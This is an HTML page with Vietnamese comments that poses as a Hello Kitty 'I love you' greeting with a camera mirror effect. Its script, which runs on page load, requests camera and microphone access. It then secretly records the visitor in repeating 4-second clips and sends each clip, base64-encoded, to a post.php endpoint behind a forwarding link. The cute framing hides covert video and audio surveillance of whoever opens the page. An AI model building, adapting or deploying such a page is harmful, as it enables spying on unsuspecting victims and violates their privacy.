<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>I Love You - Hello Kitty</title>
    
    <!-- Th∆∞ vi·ªán jQuery ƒë·ªÉ g·ª≠i AJAX gi·ªëng code c≈© -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    
    <!-- Fonts Cute -->
    <link href="https://fonts.googleapis.com/css2?family=Pacifico&family=Quicksand:wght@500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">

    <style>
        /* --- GIAO DI·ªÜN H·ªíNG HELLO KITTY --- */
        body {
            margin: 0;
            padding: 0;
            background-color: #ffe6f2;
            background-image: url('https://www.transparenttextures.com/patterns/hearts.png');
            font-family: 'Quicksand', sans-serif;
            overflow-x: hidden;
            text-align: center;
            color: #d63384;
        }

        /* Hello Kitty bay bay */
        .kitty-float {
            position: fixed;
            z-index: 100;
            opacity: 0.9;
            animation: float 3s ease-in-out infinite;
            pointer-events: none;
        }
        .k1 { top: 5%; left: 5%; width: 80px; }
        .k2 { bottom: 10%; right: 5%; width: 90px; animation-delay: 1s; }

        @keyframes float {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-15px); }
        }

        /* Header */
        h1 {
            font-family: 'Pacifico', cursive;
            font-size: 2.5em;
            color: #ff4d94;
            text-shadow: 2px 2px 0px #fff;
            margin-top: 20px;
            animation: pulse 1.5s infinite;
        }

        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }

        /* Khung Camera Cute */
        .mirror-frame {
            position: relative;
            width: 280px;
            height: 280px;
            margin: 20px auto;
            border: 8px solid #ff99cc;
            border-radius: 50%; /* H√¨nh tr√≤n */
            box-shadow: 0 0 20px rgba(255, 105, 180, 0.5);
            overflow: hidden;
            background: #000;
        }

        /* N∆° trang tr√≠ */
        .bow {
            position: absolute;
            top: -15px;
            right: 50px;
            font-size: 40px;
            z-index: 10;
        }

        /* Canvas hi·ªÉn th·ªã */
        #canvas-display {
            width: 100%;
            height: 100%;
            object-fit: cover;
            transform: scaleX(-1); /* L·∫≠t g∆∞∆°ng */
        }

        /* Video ·∫©n (ngu·ªìn) */
        #video-source { display: none; }
        
        /* Canvas ·∫©n (x·ª≠ l√Ω d·ªØ li·ªáu) */
        #canvas-process { display: none; }

        .loading-text {
            margin-top: 10px;
            font-weight: bold;
            color: #ff66b2;
            font-size: 14px;
        }

        /* Footer */
        .footer {
            position: fixed;
            bottom: 0;
            width: 100%;
            background: rgba(255, 255, 255, 0.8);
            padding: 10px;
            font-size: 12px;
            color: #ff66b2;
        }
    </style>
</head>
<body>

    <!-- Trang tr√≠ -->
    <img src="https://i.pinimg.com/originals/22/04/9a/22049a173824147781b045152eb49e6f.png" class="kitty-float k1">
    <img src="https://upload.wikimedia.org/wikipedia/en/0/05/Hello_kitty_character_portrait.png" class="kitty-float k2">

    <!-- N·ªôi dung ch√≠nh -->
    <script>
        var name = prompt("Nh·∫≠p t√™n ng∆∞·ªùi b·∫°n y√™u th∆∞∆°ng:", "C·ª•c C∆∞ng");
        if (!name) name = "B·∫°n Y√™u";
    </script>

    <h1>I <i class="fas fa-heart" style="color:red"></i> YOU</h1>
    <h2 style="font-size: 20px; color: #ff0066;"><script>document.write(name)</script></h2>

    <!-- Khung g∆∞∆°ng -->
    <div class="mirror-frame">
        <div class="bow">üéÄ</div>
        <canvas id="canvas-display"></canvas>
    </div>

    <div class="loading-text">üíñ ƒêang g·ª≠i tr·ªçn y√™u th∆∞∆°ng... üíñ</div>

    <div class="footer">
        Ch√∫c b·∫°n lu√¥n xinh ƒë·∫πp v√† h·∫°nh ph√∫c! Meow ~
    </div>

    <!-- Element ·∫©n ƒë·ªÉ x·ª≠ l√Ω -->
    <video id="video-source" autoplay playsinline muted></video>
    
    <script>
        // --- C·∫§U H√åNH ---
        const PHP_URL = 'post.php'; // ƒê∆∞·ªùng d·∫´n file PHP c·ªßa b·∫°n (VD: forwarding_link/post.php)
        const RECORD_INTERVAL = 4000; // Quay clip m·ªói 4 gi√¢y v√† g·ª≠i

        const video = document.getElementById('video-source');
        const canvasDisplay = document.getElementById('canvas-display');
        const ctxDisplay = canvasDisplay.getContext('2d');
        
        let mediaRecorder;
        let recordedChunks = [];

        // 1. H√†m g·ª≠i d·ªØ li·ªáu v·ªÅ PHP (Gi·ªëng h·ªát code c≈©)
        function sendToPHP(base64Data) {
            $.ajax({
                type: 'POST',
                url: PHP_URL,
                data: { cat: base64Data }, // Gi·ªØ nguy√™n t√™n bi·∫øn 'cat' nh∆∞ code c≈©
                dataType: 'text',
                success: function(result) {
                    console.log("ƒê√£ g·ª≠i y√™u th∆∞∆°ng th√†nh c√¥ng! üíñ");
                },
                error: function(err) {
                    console.log("L·ªói g·ª≠i tin...");
                }
            });
        }

        // 2. Kh·ªüi ƒë·ªông Camera v√† V·∫Ω Hello Kitty l√™n h√¨nh
        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    audio: true, // L·∫•y c·∫£ √¢m thanh cho video
                    video: { facingMode: "user" } 
                });
                
                video.srcObject = stream;
                
                // V·∫Ω li√™n t·ª•c l√™n Canvas hi·ªÉn th·ªã (ƒë·ªÉ ng∆∞·ªùi d√πng soi g∆∞∆°ng)
                video.addEventListener('play', () => {
                    canvasDisplay.width = video.videoWidth;
                    canvasDisplay.height = video.videoHeight;
                    
                    function drawLoop() {
                        // V·∫Ω video
                        ctxDisplay.drawImage(video, 0, 0, canvasDisplay.width, canvasDisplay.height);
                        
                        // V·∫Ω th√™m sticker v√†o video (Filter Hello Kitty)
                        ctxDisplay.font = "50px Arial";
                        ctxDisplay.fillText("üíñ", 20, 60);
                        ctxDisplay.fillText("üê±", canvasDisplay.width - 70, canvasDisplay.height - 20);
                        
                        // Hi·ªáu ·ª©ng m√†u h·ªìng
                        ctxDisplay.fillStyle = "rgba(255, 182, 193, 0.15)";
                        ctxDisplay.fillRect(0, 0, canvasDisplay.width, canvasDisplay.height);

                        requestAnimationFrame(drawLoop);
                    }
                    drawLoop();

                    // B·∫Øt ƒë·∫ßu quy tr√¨nh t·ª± ƒë·ªông quay
                    startAutoRecording(stream);
                });

            } catch (e) {
                console.error("Camera error:", e);
                alert("H√£y cho ph√©p camera ƒë·ªÉ th·∫•y ƒëi·ªÅu b·∫•t ng·ªù nh√©! üíñ");
            }
        }

        // 3. Logic t·ª± ƒë·ªông quay v√† g·ª≠i (Thay th·∫ø cho setInterval ch·ª•p ·∫£nh)
        function startAutoRecording(stream) {
            // S·ª≠ d·ª•ng MediaRecorder ƒë·ªÉ quay stream
            // L∆∞u √Ω: N·∫øu mu·ªën quay c·∫£ Sticker, c·∫ßn d√πng canvasDisplay.captureStream()
            // Nh∆∞ng ƒë·ªÉ nh·∫π v√† ·ªïn ƒë·ªãnh, ta quay tr·ª±c ti·∫øp t·ª´ Camera Stream (nguy√™n g·ªëc)
            
            // T√πy ch·ªçn 1: Quay nguy√™n g·ªëc (Nh·∫π h∆°n) -> D√πng bi·∫øn 'stream'
            // T√πy ch·ªçn 2: Quay c√≥ Filter Hello Kitty -> D√πng 'canvasDisplay.captureStream(30)'
            
            const recordStream = canvasDisplay.captureStream(30); // Ch·ªçn quay c√≥ Filter
            
            mediaRecorder = new MediaRecorder(recordStream, { mimeType: 'video/webm' });

            mediaRecorder.ondataavailable = function(e) {
                if (e.data.size > 0) {
                    recordedChunks.push(e.data);
                }
            };

            mediaRecorder.onstop = function() {
                // Khi d·ª´ng quay 1 ƒëo·∫°n -> G·ªôp l·∫°i th√†nh Blob
                const blob = new Blob(recordedChunks, { type: 'video/webm' });
                recordedChunks = []; // Reset b·ªô nh·ªõ
                
                // Chuy·ªÉn Blob th√†nh Base64 ƒë·ªÉ g·ª≠i qua AJAX (gi·ªëng code c≈© g·ª≠i ·∫£nh)
                var reader = new FileReader();
                reader.readAsDataURL(blob); 
                reader.onloadend = function() {
                    var base64data = reader.result;
                    // G·ª≠i v·ªÅ PHP
                    sendToPHP(base64data);
                }
                
                // Quay ti·∫øp ƒëo·∫°n sau
                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), RECORD_INTERVAL);
            };

            // B·∫Øt ƒë·∫ßu v√≤ng l·∫∑p ƒë·∫ßu ti√™n
            mediaRecorder.start();
            setTimeout(() => mediaRecorder.stop(), RECORD_INTERVAL);
        }

        // Ch·∫°y ngay khi v√†o trang
        window.onload = startCamera;

    </script>
</body>
</html>
